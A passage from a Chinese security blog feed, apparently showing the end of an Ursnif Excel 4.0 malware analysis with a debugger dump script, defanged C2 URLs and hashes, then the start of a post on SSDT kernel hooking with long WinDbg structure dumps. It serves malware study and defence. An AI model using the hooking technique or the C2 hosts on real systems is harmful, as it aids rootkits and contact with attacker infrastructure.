class="line">FIND:</span><br><span class="line">  RUN  </span><br><span class="line"></span><br><span class="line">CASE1:</span><br><span class="line">  CMP eip,dwGetC2</span><br><span class="line">  JNE CASE2   </span><br><span class="line">  dma eax, 100, &quot;c:\dump.bin&quot;    </span><br><span class="line">  JMP FIND   </span><br><span class="line"></span><br><span class="line">CASE2:</span><br><span class="line">  CMP eip,dwLastCall   </span><br><span class="line">  JNE FIND</span><br><span class="line">  MSG &quot;BREAK LOOP&quot;</span><br></pre></td></tr></table></figure><p>最终得到如下信息(等待了很久，未得到C2正确返回恶意模块，一直在死循环中)，由于C2地址本身为正常运营的网站，出于某种原因被Ursnif控制，因此网站仍可进行正常访问，只是恶意模块已被清除</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210505182252651.png" alt></p><p>到这里，窃密的基本功能已经分析完毕，很遗憾由于C2功能失效无法再对窃密之后的后续功能模块进行分析</p><h3 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h3><table><thead><tr><th align="center">C2</th></tr></thead><tbody><tr><td align="center">http[:]//link.rolandchase.com/setup.exe</td></tr><tr><td align="center">https[:]//gstat.262productions.com</td></tr></tbody></table><table><thead><tr><th>PE</th><th>MD5</th></tr></thead><tbody><tr><td>upeypgt.exe</td><td>7E7163283999B858DC83292F55BC4B5E</td></tr><tr><td>shellcodes1</td><td>E0B1600D07B2750AE6E80892B79C2132</td></tr><tr><td>shellcodes2</td><td>8971D8E24654E6F0AFE624C7D6A82111</td></tr><tr><td>内存PE1</td><td>A2B18DBA68CC5B76D05A0B9C7B7FB496</td></tr><tr><td>内存PE2</td><td>4F5697A5DEA383EFE93AFC4A9066E965</td></tr></tbody></table><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>EXCEL 4语法手册：<a href="https://d13ot9o61jdzpp.cloudfront.net/files/Excel%204.0%20Macro%20Functions%20Reference.pdf" target="_blank" rel="noopener">https://d13ot9o61jdzpp.cloudfront.net/files/Excel%204.0%20Macro%20Functions%20Reference.pdf</a></p><p>IE注册表配置：<a href="https://www.fooher.com/20170503_75.html" target="_blank" rel="noopener">https://www.fooher.com/20170503_75.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Ursnif组织EXCEL4-0样本分析&quot;&gt;&lt;a href=&quot;#Ursnif组织EXCEL4-0样本分析&quot; class=&quot;headerlink&quot; title=&quot;Ursnif组织EXCEL4.0样本分析&quot;&gt;&lt;/a&gt;Ursnif组织EXCEL4.0样本分析&lt;/h2&gt;&lt;
      
    
    </summary>
    
    
      <category term="技巧" scheme="http://yeanhoo.gitee.io/categories/%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="样本分析" scheme="http://yeanhoo.gitee.io/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
      <category term="Ursnif" scheme="http://yeanhoo.gitee.io/tags/Ursnif/"/>
    
  </entry>
  
  <entry>
    <title>SSDT_HOOK</title>
    <link href="http://yeanhoo.gitee.io/2021/04/26/SSDT_HOOK/"/>
    <id>http://yeanhoo.gitee.io/2021/04/26/SSDT_HOOK/</id>
    <published>2021-04-26T15:07:23.554Z</published>
    <updated>2021-04-26T15:06:38.122Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSDT-HOOK"><a href="#SSDT-HOOK" class="headerlink" title="SSDT_HOOK"></a>SSDT_HOOK</h2><p>SSDT  原理其实很简单，首先通过API拿到ETRHEAD结构地址，通过结构成员拿到<code>ServiceTable</code>表，<code>_KSERVICE_TABLE_DESCRIPTOR</code>(ServiceTable)中第一项指向的内容就是SSDT <code>_KSYSTEM_SERVICE_TABLE</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _KSYSTEM_SERVICE_TABLE</span><br><span class="line">&#123;</span><br><span class="line">PULONGServiceTableBase;&#x2F;&#x2F;函数地址表首地址</span><br><span class="line">PULONGServiceCounterTableBase;&#x2F;&#x2F;函数表中每个函数被调用次数</span><br><span class="line">ULONGNumberOfService;&#x2F;&#x2F;服务函数个数</span><br><span class="line">ULONGParamTableBse;&#x2F;&#x2F;参数个数表首地址</span><br><span class="line"></span><br><span class="line">&#125;KSYSTEM_SERVICE_TABLE,*PKSYSTEM_SERVICE_TABLE;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/yeanhoo/codebank/tree/main/SSDT_HOOK_demo" target="_blank" rel="noopener">代码已开源：点击访问</a></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2021-4-26-1.gif" alt></p><p>windbg查看记录一下ETHREAD及EPROCESS结构体</p><p><code>ETHREAD</code>(执行体线程块)结构内嵌了<code>KTHREAD</code>，<code>EPROCESS</code>(执行体进程块)结构内嵌了<code>KPROCESS</code></p><p><code>ETHREAD</code>结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _ETHREAD</span><br><span class="line">nt!_ETHREAD</span><br><span class="line">   +<span class="number">0x000</span> Tcb              : _KTHREAD<span class="comment">//KTHREAD结构</span></span><br><span class="line">   +<span class="number">0x200</span> CreateTime       : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x208</span> ExitTime         : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x208</span> KeyedWaitChain   : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x210</span> ExitStatus       : Int4B</span><br><span class="line">   +<span class="number">0x214</span> PostBlockList    : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x214</span> ForwardLinkShadow : Ptr32 Void</span><br><span class="line">   +<span class="number">0x218</span> StartAddress     : Ptr32 Void</span><br><span class="line">   +<span class="number">0x21c</span> TerminationPort  : Ptr32 _TERMINATION_PORT</span><br><span class="line">   +<span class="number">0x21c</span> ReaperLink       : Ptr32 _ETHREAD</span><br><span class="line">   +<span class="number">0x21c</span> KeyedWaitValue   : Ptr32 Void</span><br><span class="line">   +<span class="number">0x220</span> ActiveTimerListLock : Uint4B</span><br><span class="line">   +<span class="number">0x224</span> ActiveTimerListHead : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x22c</span> Cid              : _CLIENT_ID</span><br><span class="line">   +<span class="number">0x234</span> KeyedWaitSemaphore : _KSEMAPHORE</span><br><span class="line">   +<span class="number">0x234</span> AlpcWaitSemaphore : _KSEMAPHORE</span><br><span class="line">   +<span class="number">0x248</span> ClientSecurity   : _PS_CLIENT_SECURITY_CONTEXT</span><br><span class="line">   +<span class="number">0x24c</span> IrpList          : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x254</span> TopLevelIrp      : Uint4B</span><br><span class="line">   +<span class="number">0x258</span> DeviceToVerify   : Ptr32 _DEVICE_OBJECT</span><br><span class="line">   +<span class="number">0x25c</span> CpuQuotaApc      : Ptr32 _PSP_CPU_QUOTA_APC</span><br><span class="line">   +<span class="number">0x260</span> Win32StartAddress : Ptr32 Void</span><br><span class="line">   +<span class="number">0x264</span> LegacyPowerObject : Ptr32 Void</span><br><span class="line">   +<span class="number">0x268</span> ThreadListEntry  : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x270</span> RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   +<span class="number">0x274</span> ThreadLock       : _EX_PUSH_LOCK</span><br><span class="line">   +<span class="number">0x278</span> ReadClusterSize  : Uint4B</span><br><span class="line">   +<span class="number">0x27c</span> MmLockOrdering   : Int4B</span><br><span class="line">   +<span class="number">0x280</span> CrossThreadFlags : Uint4B</span><br><span class="line">   +<span class="number">0x280</span> Terminated       : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x280</span> ThreadInserted   : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x280</span> HideFromDebugger : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x280</span> ActiveImpersonationInfo : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x280</span> Reserved         : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x280</span> HardErrorsAreDisabled : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x280</span> BreakOnTermination : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x280</span> SkipCreationMsg  : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x280</span> SkipTerminationMsg : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x280</span> CopyTokenOnOpen  : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x280</span> ThreadIoPriority : Pos <span class="number">10</span>, <span class="number">3</span> Bits</span><br><span class="line">   +<span class="number">0x280</span> ThreadPagePriority : Pos <span class="number">13</span>, <span class="number">3</span> Bits</span><br><span class="line">   +<span class="number">0x280</span> RundownFail      : Pos <span class="number">16</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x280</span> NeedsWorkingSetAging : Pos <span class="number">17</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x284</span> SameThreadPassiveFlags : Uint4B</span><br><span class="line">   +<span class="number">0x284</span> ActiveExWorker   : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x284</span> ExWorkerCanWaitUser : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x284</span> MemoryMaker      : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x284</span> ClonedThread     : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x284</span> KeyedEventInUse  : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x284</span> RateApcState     : Pos <span class="number">5</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x284</span> SelfTerminate    : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x288</span> SameThreadApcFlags : Uint4B</span><br><span class="line">   +<span class="number">0x288</span> Spare            : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x288</span> StartAddressInvalid : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x288</span> EtwPageFaultCalloutActive : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x288</span> OwnsProcessWorkingSetExclusive : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x288</span> OwnsProcessWorkingSetShared : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x288</span> OwnsSystemCacheWorkingSetExclusive : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x288</span> OwnsSystemCacheWorkingSetShared : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x288</span> OwnsSessionWorkingSetExclusive : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x289</span> OwnsSessionWorkingSetShared : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x289</span> OwnsProcessAddressSpaceExclusive : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x289</span> OwnsProcessAddressSpaceShared : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x289</span> SuppressSymbolLoad : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x289</span> Prefetching      : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x289</span> OwnsDynamicMemoryShared : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x289</span> OwnsChangeControlAreaExclusive : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x289</span> OwnsChangeControlAreaShared : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x28a</span> OwnsPagedPoolWorkingSetExclusive : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x28a</span> OwnsPagedPoolWorkingSetShared : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x28a</span> OwnsSystemPtesWorkingSetExclusive : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x28a</span> OwnsSystemPtesWorkingSetShared : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x28a</span> TrimTrigger      : Pos <span class="number">4</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x28a</span> Spare1           : Pos <span class="number">6</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x28b</span> PriorityRegionActive : UChar</span><br><span class="line">   +<span class="number">0x28c</span> CacheManagerActive : UChar</span><br><span class="line">   +<span class="number">0x28d</span> DisablePageFaultClustering : UChar</span><br><span class="line">   +<span class="number">0x28e</span> ActiveFaultCount : UChar</span><br><span class="line">   +<span class="number">0x28f</span> LockOrderState   : UChar</span><br><span class="line">   +<span class="number">0x290</span> AlpcMessageId    : Uint4B</span><br><span class="line">   +<span class="number">0x294</span> AlpcMessage      : Ptr32 Void</span><br><span class="line">   +<span class="number">0x294</span> AlpcReceiveAttributeSet : Uint4B</span><br><span class="line">   +<span class="number">0x298</span> AlpcWaitListEntry : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x2a0</span> CacheManagerCount : Uint4B</span><br><span class="line">   +<span class="number">0x2a4</span> IoBoostCount     : Uint4B</span><br><span class="line">   +<span class="number">0x2a8</span> IrpListLock      : Uint4B</span><br><span class="line">   +<span class="number">0x2ac</span> ReservedForSynchTracking : Ptr32 Void</span><br><span class="line">   +<span class="number">0x2b0</span> CmCallbackListHead : _SINGLE_LIST_ENTRY</span><br></pre></td></tr></table></figure><p><code>KTHREAD</code>结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">nt!_KTHREAD</span><br><span class="line">   +<span class="number">0x000</span> Header           : _DISPATCHER_HEADER</span><br><span class="line">   +<span class="number">0x010</span> CycleTime        : Uint8B</span><br><span class="line">   +<span class="number">0x018</span> HighCycleTime    : Uint4B</span><br><span class="line">   +<span class="number">0x020</span> QuantumTarget    : Uint8B</span><br><span class="line">   +<span class="number">0x028</span> InitialStack     : Ptr32 Void</span><br><span class="line">   +<span class="number">0x02c</span> StackLimit       : Ptr32 Void</span><br><span class="line">   +<span class="number">0x030</span> KernelStack      : Ptr32 Void</span><br><span class="line">   +<span class="number">0x034</span> ThreadLock       : Uint4B</span><br><span class="line">   +<span class="number">0x038</span> WaitRegister     : _KWAIT_STATUS_REGISTER</span><br><span class="line">   +<span class="number">0x039</span> Running          : UChar</span><br><span class="line">   +<span class="number">0x03a</span> Alerted          : [<span class="number">2</span>] UChar</span><br><span class="line">   +<span class="number">0x03c</span> KernelStackResident : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x03c</span> ReadyTransition  : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x03c</span> ProcessReadyQueue : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x03c</span> WaitNext         : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x03c</span> SystemAffinityActive : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x03c</span> Alertable        : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x03c</span> GdiFlushActive   : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x03c</span> UserStackWalkActive : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x03c</span> ApcInterruptRequest : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x03c</span> ForceDeferSchedule : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x03c</span> QuantumEndMigrate : Pos <span class="number">10</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x03c</span> UmsDirectedSwitchEnable : Pos <span class="number">11</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x03c</span> TimerActive      : Pos <span class="number">12</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x03c</span> SystemThread     : Pos <span class="number">13</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x03c</span> Reserved         : Pos <span class="number">14</span>, <span class="number">18</span> Bits</span><br><span class="line">   +<span class="number">0x03c</span> MiscFlags        : Int4B</span><br><span class="line">   +<span class="number">0x040</span> ApcState         : _KAPC_STATE</span><br><span class="line">   +<span class="number">0x040</span> ApcStateFill     : [<span class="number">23</span>] UChar</span><br><span class="line">   +<span class="number">0x057</span> Priority         : Char</span><br><span class="line">   +<span class="number">0x058</span> NextProcessor    : Uint4B</span><br><span class="line">   +<span class="number">0x05c</span> DeferredProcessor : Uint4B</span><br><span class="line">   +<span class="number">0x060</span> ApcQueueLock     : Uint4B</span><br><span class="line">   +<span class="number">0x064</span> ContextSwitches  : Uint4B</span><br><span class="line">   +<span class="number">0x068</span> State            : UChar</span><br><span class="line">   +<span class="number">0x069</span> NpxState         : Char</span><br><span class="line">   +<span class="number">0x06a</span> WaitIrql         : UChar</span><br><span class="line">   +<span class="number">0x06b</span> WaitMode         : Char</span><br><span class="line">   +<span class="number">0x06c</span> WaitStatus       : Int4B</span><br><span class="line">   +<span class="number">0x070</span> WaitBlockList    : Ptr32 _KWAIT_BLOCK</span><br><span class="line">   +<span class="number">0x074</span> WaitListEntry    : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x074</span> SwapListEntry    : _SINGLE_LIST_ENTRY</span><br><span class="line">   +<span class="number">0x07c</span> Queue            : Ptr32 _KQUEUE</span><br><span class="line">   +<span class="number">0x080</span> WaitTime         : Uint4B</span><br><span class="line">   +<span class="number">0x084</span> KernelApcDisable : Int2B</span><br><span class="line">   +<span class="number">0x086</span> SpecialApcDisable : Int2B</span><br><span class="line">   +<span class="number">0x084</span> CombinedApcDisable : Uint4B</span><br><span class="line">   +<span class="number">0x088</span> Teb              : Ptr32 Void</span><br><span class="line">   +<span class="number">0x090</span> Timer            : _KTIMER</span><br><span class="line">   +<span class="number">0x0b8</span> AutoAlignment    : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x0b8</span> DisableBoost     : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x0b8</span> EtwStackTraceApc1Inserted : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x0b8</span> EtwStackTraceApc2Inserted : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x0b8</span> CalloutActive    : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x0b8</span> ApcQueueable     : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x0b8</span> EnableStackSwap  : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x0b8</span> GuiThread        : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x0b8</span> UmsPerformingSyscall : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x0b8</span> VdmSafe          : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x0b8</span> UmsDispatched    : Pos <span class="number">10</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x0b8</span> ReservedFlags    : Pos <span class="number">11</span>, <span class="number">21</span> Bits</span><br><span class="line">   +<span class="number">0x0b8</span> ThreadFlags      : Int4B</span><br><span class="line">   +<span class="number">0x0bc</span> ServiceTable     : Ptr32 Void <span class="comment">//SSDT表</span></span><br><span class="line">   +<span class="number">0x0c0</span> WaitBlock        : [<span class="number">4</span>] _KWAIT_BLOCK</span><br><span class="line">   +<span class="number">0x120</span> QueueListEntry   : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x128</span> TrapFrame        : Ptr32 _KTRAP_FRAME</span><br><span class="line">   +<span class="number">0x12c</span> FirstArgument    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x130</span> CallbackStack    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x130</span> CallbackDepth    : Uint4B</span><br><span class="line">   +<span class="number">0x134</span> ApcStateIndex    : UChar</span><br><span class="line">   +<span class="number">0x135</span> BasePriority     : Char</span><br><span class="line">   +<span class="number">0x136</span> PriorityDecrement : Char</span><br><span class="line">   +<span class="number">0x136</span> ForegroundBoost  : Pos <span class="number">0</span>, <span class="number">4</span> Bits</span><br><span class="line">   +<span class="number">0x136</span> UnusualBoost     : Pos <span class="number">4</span>, <span class="number">4</span> Bits</span><br><span class="line">   +<span class="number">0x137</span> Preempted        : UChar</span><br><span class="line">   +<span class="number">0x138</span> AdjustReason     : UChar</span><br><span class="line">   +<span class="number">0x139</span> AdjustIncrement  : Char</span><br><span class="line">   +<span class="number">0x13a</span> PreviousMode     : Char</span><br><span class="line">   +<span class="number">0x13b</span> Saturation       : Char</span><br><span class="line">   +<span class="number">0x13c</span> SystemCallNumber : Uint4B</span><br><span class="line">   +<span class="number">0x140</span> FreezeCount      : Uint4B</span><br><span class="line">   +<span class="number">0x144</span> UserAffinity     : _GROUP_AFFINITY</span><br><span class="line">   +<span class="number">0x150</span> <span class="built_in">Process</span>          : Ptr32 _KPROCESS</span><br><span class="line">   +<span class="number">0x154</span> Affinity         : _GROUP_AFFINITY</span><br><span class="line">   +<span class="number">0x160</span> IdealProcessor   : Uint4B</span><br><span class="line">   +<span class="number">0x164</span> UserIdealProcessor : Uint4B</span><br><span class="line">   +<span class="number">0x168</span> ApcStatePointer  : [<span class="number">2</span>] Ptr32 _KAPC_STATE</span><br><span class="line">   +<span class="number">0x170</span> SavedApcState    : _KAPC_STATE</span><br><span class="line">   +<span class="number">0x170</span> SavedApcStateFill : [<span class="number">23</span>] UChar</span><br><span class="line">   +<span class="number">0x187</span> WaitReason       : UChar</span><br><span class="line">   +<span class="number">0x188</span> SuspendCount     : Char</span><br><span class="line">   +<span class="number">0x189</span> Spare1           : Char</span><br><span class="line">   +<span class="number">0x18a</span> OtherPlatformFill : UChar</span><br><span class="line">   +<span class="number">0x18c</span> Win32Thread      : Ptr32 Void</span><br><span class="line">   +<span class="number">0x190</span> StackBase        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x194</span> SuspendApc       : _KAPC</span><br><span class="line">   +<span class="number">0x194</span> SuspendApcFill0  : [<span class="number">1</span>] UChar</span><br><span class="line">   +<span class="number">0x195</span> ResourceIndex    : UChar</span><br><span class="line">   +<span class="number">0x194</span> SuspendApcFill1  : [<span class="number">3</span>] UChar</span><br><span class="line">   +<span class="number">0x197</span> QuantumReset     : UChar</span><br><span class="line">   +<span class="number">0x194</span> SuspendApcFill2  : [<span class="number">4</span>] UChar</span><br><span class="line">   +<span class="number">0x198</span> KernelTime       : Uint4B</span><br><span class="line">   +<span class="number">0x194</span> SuspendApcFill3  : [<span class="number">36</span>] UChar</span><br><span class="line">   +<span class="number">0x1b8</span> WaitPrcb         : Ptr32 _KPRCB</span><br><span class="line">   +<span class="number">0x194</span> SuspendApcFill4  : [<span class="number">40</span>] UChar</span><br><span class="line">   +<span class="number">0x1bc</span> LegoData         : Ptr32 Void</span><br><span class="line">   +<span class="number">0x194</span> SuspendApcFill5  : [<span class="number">47</span>] UChar</span><br><span class="line">   +<span class="number">0x1c3</span> LargeStack       : UChar</span><br><span class="line">   +<span class="number">0x1c4</span> UserTime         : Uint4B</span><br><span class="line">   +<span class="number">0x1c8</span> SuspendSemaphore : _KSEMAPHORE</span><br><span class="line">   +<span class="number">0x1c8</span> SuspendSemaphorefill : [<span class="number">20</span>] UChar</span><br><span class="line">   +<span class="number">0x1dc</span> SListFaultCount  : Uint4B</span><br><span class="line">   +<span class="number">0x1e0</span> ThreadListEntry  : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x1e8</span> 